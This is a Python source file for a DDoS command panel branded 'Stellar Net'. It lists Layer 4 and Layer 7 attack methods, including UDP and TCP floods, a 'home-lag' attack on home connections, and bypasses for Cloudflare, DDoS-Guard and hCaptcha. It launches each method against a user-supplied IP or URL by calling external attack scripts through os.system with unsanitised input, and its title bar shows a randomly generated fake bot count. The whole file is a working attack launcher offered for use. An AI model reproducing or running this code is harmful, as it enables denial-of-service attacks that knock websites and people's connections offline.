import socket
import time
import os
import requests
import sys
import random
import datetime
import pytz

dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)




today = dt_mtn.strftime('%B %d, %Y')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def layer7():
    """
old xd
    """
    clear()
    print(f'''

                            \x1b[38;2;112;13;255m__    _____  ____________     _____
                           \x1b[38;2;112;13;255m/ /   /   \ \/ / ____/ __ \   /__  /
                          \x1b[38;2;112;13;255m/ /   / /| |\  / __/ / /_/ /     / / 
                         \x1b[38;2;112;13;255m/ /___/ ___ |/ / /___/ _, _/     / /  
                        \x1b[38;2;112;13;255m/_____/_/  |_/_/_____/_/ |_|     /_/ 

            \x1b[38;2;85;71;255m╚═══╦══════════\x1b[38;2;31;13;255m════════╦═══════\x1b[38;2;112;13;255m═════\x1b[38;2;137;3;255m═══╦═════\x1b[38;2;201;3;255m═══════\x1b[38;2;236;3;255m═════╦════╝
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mcfnuke          \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mmh-ddosguard  \x1b[38;2;112;13;255m║  \x1b[38;2;255;0;0mmh-pps         \x1b[38;2;236;3;255m║     
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mgoat-bypass     \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mhcaptcha      \x1b[38;2;112;13;255m║  \x1b[38;2;255;0;0mmh-get         \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mhttp-root       \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mcf-unmitigate \x1b[38;2;112;13;255m║  \x1b[38;2;255;0;0mmh-post        \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mmh-cfbypass     \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mhttp-raw      \x1b[38;2;112;13;255m║  \x1b[38;2;255;0;0mmh-dyn         \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m╚══════════\x1b[38;2;31;13;255m════════╝═══════\x1b[38;2;112;13;255m═════\x1b[38;2;137;3;255m═══╚════\x1b[38;2;201;3;255m═══════\x1b[38;2;236;3;255m══════╝
''')

def layer4():
    """
old xd
    """
    print(f'''
                          \x1b[38;2;112;13;255m __    _____  ____________     __ __
                          \x1b[38;2;112;13;255m/ /   /   \ \/ / ____/ __ \   / // /
                         \x1b[38;2;112;13;255m/ /   / /| |\  / __/ / /_/ /  / // /_
                        \x1b[38;2;112;13;255m/ /___/ ___ |/ / /___/ _, _/  /__  __/
                       \x1b[38;2;112;13;255m/_____/_/  |_/_/_____/_/ |_|     /_/   
                    
            \x1b[38;2;85;71;255m╚═══╦══════════\x1b[38;2;31;13;255m════════╦═══════\x1b[38;2;112;13;255m═════\x1b[38;2;137;3;255m═══╦═════\x1b[38;2;201;3;255m═══════\x1b[38;2;236;3;255m═════╦════╝
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mudp-god         \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mudpbypass     \x1b[38;2;137;3;255m║  \x1b[38;2;255;0;0m<empty>        \x1b[38;2;236;3;255m║     
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mtcp-god         \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mnfo-saturn    \x1b[38;2;137;3;255m║  \x1b[38;2;255;0;0m<empty>        \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mhaven-god       \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mmovhnat       \x1b[38;2;137;3;255m║  \x1b[38;2;255;0;0m<empty>        \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m║  \x1b[38;2;255;0;0mhome-lag        \x1b[38;2;31;13;255m║ \x1b[38;2;255;0;0mfivemovh      \x1b[38;2;137;3;255m║  \x1b[38;2;255;0;0m<empty>        \x1b[38;2;236;3;255m║
                \x1b[38;2;85;71;255m╚══════════\x1b[38;2;31;13;255m════════╝═══════\x1b[38;2;112;13;255m═════\x1b[38;2;137;3;255m═══╚════\x1b[38;2;201;3;255m═══════\x1b[38;2;236;3;255m══════╝
''')

def l4():
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                          Layer 4 Methods
                                \x1b[38;2;8;140;255m═════════╦════════════════╦══════════ 
                        \x1b[38;2;8;140;255m╔════════════════╩════════════════╩════════════════╗
             \x1b[38;2;8;140;255m╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mudp-god            \x1b[38;2;8;140;255m║ L║  \x1b[38;2;237;255;253mtelnet             \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253m<empty>              \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mhome-lag           \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mhaven-god          \x1b[38;2;8;140;255m║ 4║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║ 4 ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝
    ''')

def l7():
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                          Layer 7 Methods
                                \x1b[38;2;8;140;255m═════════╦════════════════╦══════════ 
                        \x1b[38;2;8;140;255m╔════════════════╩════════════════╩════════════════╗
             \x1b[38;2;8;140;255m╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mcfnuke             \x1b[38;2;8;140;255m║L ║  \x1b[38;2;237;255;253mgoat-bypass        \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253mhttp-raw           \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-cfb             \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253mcfsocket           \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253mhttp-root          \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-cfuam           \x1b[38;2;8;140;255m║7 ║  \x1b[38;2;237;255;253mmh-ddosguard       \x1b[38;2;8;140;255m║ 7 ║  \x1b[38;2;237;255;253mhttp-get           \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╠═════════════════════╬══╬═════════════════════╬═══╬═════════════════════╝
             \x1b[38;2;8;140;255m╠═════════════════════╬══╬═════════════════════╬═══╬═════════════════════╗
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-post            \x1b[38;2;8;140;255m║L ║  \x1b[38;2;237;255;253mmh-dyn             \x1b[38;2;8;140;255m║ L ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-head            \x1b[38;2;8;140;255m║  ║  \x1b[38;2;237;255;253mmh-google          \x1b[38;2;8;140;255m║   ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m║  \x1b[38;2;237;255;253mmh-pps             \x1b[38;2;8;140;255m║7 ║  \x1b[38;2;237;255;253mhcaptcha-solver    \x1b[38;2;8;140;255m║ 7 ║  \x1b[38;2;237;255;253m<empty>            \x1b[38;2;8;140;255m║
             \x1b[38;2;8;140;255m╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝
''')
    

def main():
    clear()
    print(f'''
                                \x1b[38;2;8;140;255m.▄▄ · ▄▄▄▄\x1b[38;2;54;163;255m▄▄▄▄ .▄\x1b[38;2;100;186;254m▄▌  ▄\x1b[38;2;145;209;254m▄▌   \x1b[38;2;191;232;253m▄▄▄·\x1b[38;2;237;255;253m ▄▄▄  
                                \x1b[38;2;8;140;255m▐█ ▀. •██\x1b[38;2;54;163;255m  ▀▄.▀·█\x1b[38;2;100;186;254m█•  █\x1b[38;2;145;209;254m█•  ▐\x1b[38;2;191;232;253m█ ▀█\x1b[38;2;237;255;253m ▀▄ █·
                                \x1b[38;2;8;140;255m▄▀▀▀█▄ ▐█.\x1b[38;2;54;163;255m▪▐▀▀▪▄█\x1b[38;2;100;186;254m█▪  █\x1b[38;2;145;209;254m█▪  ▄\x1b[38;2;191;232;253m█▀▀█ \x1b[38;2;237;255;253m▐▀▀▄ 
                                \x1b[38;2;8;140;255m▐█▄▪▐█ ▐█▌\x1b[38;2;54;163;255m·▐█▄▄▌▐\x1b[38;2;100;186;254m█▌▐▌▐\x1b[38;2;145;209;254m█▌▐▌▐\x1b[38;2;191;232;253m█ ▪▐▌\x1b[38;2;237;255;253m▐█•█▌
                                \x1b[38;2;8;140;255m ▀▀▀▀  ▀▀▀\x1b[38;2;54;163;255m  ▀▀▀ .\x1b[38;2;100;186;254m▀▀▀ .\x1b[38;2;145;209;254m▀▀▀  \x1b[38;2;191;232;253m▀  ▀ \x1b[38;2;237;255;253m.▀  ▀
                                   Sending meteorites to servers...
                      \x1b[38;2;8;140;255m════════\x1b[38;2;54;163;255m═════╦══════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m══════╦══\x1b[38;2;237;255;253m════════════
                  \x1b[38;2;8;140;255m╔═══════════\x1b[38;2;54;163;255m═════╩══════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m══════╩══\x1b[38;2;237;255;253m═══════════════╗
                  \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m - - - - - - - -   \x1b[38;2;191;232;253mWelcome to Stellar Net   \x1b[38;2;0;243;255m- - - - - - - -   \x1b[38;2;237;255;253m║
                  \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m- - - - - - - \x1b[38;2;191;232;253mType [help] to see the commands \x1b[38;2;0;243;255m- - - - - - - - \x1b[38;2;237;255;253m║
                  \x1b[38;2;8;140;255m╚═══════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m═══════════════╝
              \x1b[38;2;8;140;255m╔═══════════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m════════════════════╗
              \x1b[38;2;8;140;255m║ \x1b[38;2;0;243;255m- - - - - - - - - - - \x1b[38;2;191;232;253mConnection is \x1b[38;2;8;255;0m(ESTABLISHED.) \x1b[38;2;0;243;255m- - - - - - - - - - \x1b[38;2;237;255;253m║
              \x1b[38;2;8;140;255m╚═══════════════\x1b[38;2;54;163;255m════════════\x1b[38;2;100;186;254m════════\x1b[38;2;145;209;254m════════\x1b[38;2;191;232;253m═════════\x1b[38;2;237;255;253m════════════════════╝
''')    
    while True:
        cnc = input(f'''\x1b[38;2;8;140;255m╔═══[Ghost@\x1b[38;2;100;186;254mSt\x1b[38;2;145;209;254mel\x1b[38;2;191;232;253mla\x1b[38;2;237;255;253mr]
\x1b[38;2;8;140;255m╚═\x1b[38;2;54;163;255m═\x1b[38;2;100;186;254m═\x1b[38;2;145;209;254m═\x1b[38;2;191;232;253m═\x1b[38;2;237;255;253m═> ''')

        if 'cfnuke' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf-bypass.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cfnuke <url> <time> <threads>')

        elif 'cfsocket' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CFSockets.js {url} {time}')
            except IndexError:
                print('Usage: cfsocket <url> <time>')

        elif 'hcaptcha-solver' in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'node Captcha.js {url}')
            except IndexError:
                print('Usage: hcaptcha-solver <url>')

        elif 'http-root' in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python2 http-root.py {url}')
            except IndexError:
                print('Usage: http-root <url>')

        elif 'goat-bypass' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                requests = cnc.split()[3]
                os.system(f'node method.js {url} {time} request {requests}')
            except IndexError:
                print('Usage: goat-bypass <url> <time> <rps/threads>')

        elif 'udp-god' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print('Usage: udp-god <ip> <port> <threads> <throttle> <time>')

        elif 'home-lag' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home-lag <ip> <port> <psize/50000> <time>')

        elif 'telnet' in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
            except IndexError:
                print('Usage: telnet <ip> <threads> <pps> <time>')

        elif 'mh-cfb' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py CFB {url} 1 {threads} nose.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-cfb <url> <threads> <rpc> <time>')

        elif 'mh-cfuam' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py CFBUAM {url} 1 {threads} nose5.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-cfuam <url> <threads> <rpc> <time>')

        elif 'mh-post' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py POST {url} 1 {threads} nose1.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-post <url> <threads> <rpc> <time>')

        elif 'mh-get' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py GET {url} 1 {threads} nose2.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-get <url> <threads> <rpc> <time>')

        elif 'mh-pps' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py PPS {url} 1 {threads} nose3.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-pps <url> <threads> <rpc> <time>')

        elif 'mh-head' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py HEAD {url} 1 {threads} nose4.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-head <url> <threads> <rpc> <time>')

        elif 'mh-dyn' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py DYN {url} 1 {threads} nose4.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-dyn <url> <threads> <rpc> <time>')

        elif 'mh-google' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py GSB {url} 1 {threads} nose4.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-google <url> <threads> <rpc> <time>')

        elif 'mh-ddosguard' in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python3 start.py DGB {url} 1 {threads} nose4.txt {rpc} {time}')
            except IndexError:
                print(f'Usage: mh-ddosguard <url> <threads> <rpc> <time>')

        elif 'haven-god' in cnc:
            try:
                ip = cnc.split()[1]
                os.system(f'sudo ./haven -d {ip}')
            except IndexError:
                print('Usage: haven-god <ip>')

        elif 'http-raw' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')

        elif 'http-get' in cnc:
            try:
                url = cnc.split()[1]
                idk1 = cnc.split()[2]
                idk2 = cnc.split()[3]
                idk3 = cnc.split()[4]
                os.system(f'perl httpget {url} {idk1} {idk2} {idk3}')
            except IndexError:
                print('Usage: http-get <url> <10000> <50> <100>')

        elif 'layer7' in cnc:
            clear()
            l7()
        
        elif 'layer4' in cnc:
            clear()
            l4()

        elif 'help' in cnc:
            print("""
╔═════
║  layer7 : Layer 7 Attack Methods
║  layer4 : Layer 4 Attack Methods
║  clear  : Clear the console
╚═════
""")

        elif cnc == 'clear' or cnc == 'cls':
            main()


if __name__ == "__main__":
    try:
        bots = (random.randint(98,358))
        sys.stdout.write(f"\x1b]2;Stellar Net > Bots: [{bots}] | Online Users: [1] | Methods: [19] | Bypass: [8]\x07")
        main()
    except KeyboardInterrupt:
        print('Bye!\n')
